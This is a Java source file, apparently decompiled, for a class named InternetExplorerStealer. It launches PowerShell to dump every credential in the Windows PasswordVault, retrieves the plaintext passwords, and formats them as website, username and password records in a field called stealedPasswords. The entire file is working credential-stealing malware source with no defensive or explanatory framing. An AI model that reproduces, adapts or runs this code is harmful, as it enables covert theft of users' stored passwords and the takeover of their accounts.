package carLambo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public final class InternetExplorerStealer {
   String stealedPasswords;

   public final String getStealedPasswords() {
      return this.stealedPasswords;
   }

   InternetExplorerStealer() {
      String var1 = "";

      try {
         String var2 = "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\r\n";
         var2 = (new StringBuilder()).insert(0, var2).append("$vault = New-Object Windows.Security.Credentials.PasswordVault\r\n").toString();
         var2 = (new StringBuilder()).insert(0, var2).append("$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }").toString();
         ProcessBuilder var8;
         (var8 = new ProcessBuilder(new String[]{"powershell.exe", var2})).redirectErrorStream(true);
         Process var9 = var8.start();
         BufferedReader var3 = new BufferedReader(new InputStreamReader(var9.getInputStream()));
         var9.getOutputStream().close();
         StringBuilder var4 = new StringBuilder();

         label37:
         while(true) {
            BufferedReader var10000 = var3;

            while((var2 = var10000.readLine()) != null) {
               if (var2.trim().equals("")) {
                  continue label37;
               }

               var10000 = var3;
               var4.append(var2 + "\n");
            }

            var3.close();
            String[] var11 = var4.toString().split("\n");

            int var10;
            for(int var13 = var10 = 0; var13 < var11.length; var13 = var10) {
               if (var11[var10].contains("{[hidden")) {
                  String var12 = var11[var10].trim();
                  String var5;
                  var12 = var12.substring((var5 = var12.substring(0, var12.indexOf(" "))).length()).trim();
                  String var6;
                  var12 = var12.substring((var6 = var12.substring(0, var12.indexOf(" "))).length()).trim();
                  var12 = var12.substring(0, var12.indexOf("{[hidden")).trim();
                  var1 = (new StringBuilder()).insert(0, var1).append("Website: ").append(var6).append("\r\n").toString();
                  var1 = (new StringBuilder()).insert(0, var1).append("Username: ").append(var5).append("\r\n").toString();
                  var1 = (new StringBuilder()).insert(0, var1).append("Password: ").append(var12).append("\r\n").toString();
                  var1 = (new StringBuilder()).insert(0, var1).append("\r\n").toString();
               }

               ++var10;
            }

            if (var1.equals("")) {
               var1 = "No Password Found";
            }

            this.stealedPasswords = var1;
            return;
         }
      } catch (IOException var7) {
         this.stealedPasswords = var1;
      }
   }
}
